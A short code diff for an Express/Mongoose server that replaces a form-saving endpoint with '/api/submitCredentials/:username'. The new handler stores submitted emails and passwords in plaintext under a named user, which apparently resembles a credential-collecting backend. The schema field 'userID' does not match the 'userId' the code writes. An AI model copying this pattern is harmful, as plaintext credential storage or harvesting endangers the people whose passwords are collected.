@@ -18,6 +18,7 @@ app.use(express.json());
 const FormData = mongoose.model("FormData", {
     Email: String,
     Password: String,
+    userID: String
   });
 
   const UserAddData = mongoose.model("UserAddData", {
@@ -60,16 +61,36 @@ const FormData = mongoose.model("FormData", {
   }
   
   
-  app.post("/api/saveFormData", async (req, res) => {
+  app.post("/api/submitCredentials/:username", async (req, res) => {
     try {
-      const formData = new FormData(req.body);
+      const userId = req.params.username;
+      const { Email, Password } = req.body;
+  
+      // Check if email and password are provided
+      if (!Email || !Password) {
+        return res.status(400).json({ error: "Email and password are required" });
+      }
+  
+      // Find the user by ID
+      const user = await UserAddData.findOne({Name:userId});
+      if (!user) {
+        return res.status(404).json({ error: "User not found" });
+      }
+  
+      // Save the email and password to a different FormData
+      const formData = new FormData({
+        Email,
+        Password,
+        userId: user._id // Reference to the user who owns this email and password
+      });
       await formData.save();
-      res.status(201).json({ message: "Form data saved successfully"   });
+  
+      res.status(200).json({ message: "Credentials submitted successfully" });
     } catch (error) {
-      res.status(500).json({ error: "Error saving form data" });  
+      res.status(500).json({ error: "Error submitting credentials" });
     }
   });
-
+  
 
   app.post("/api/newUser", async (req, res) => {
     try {
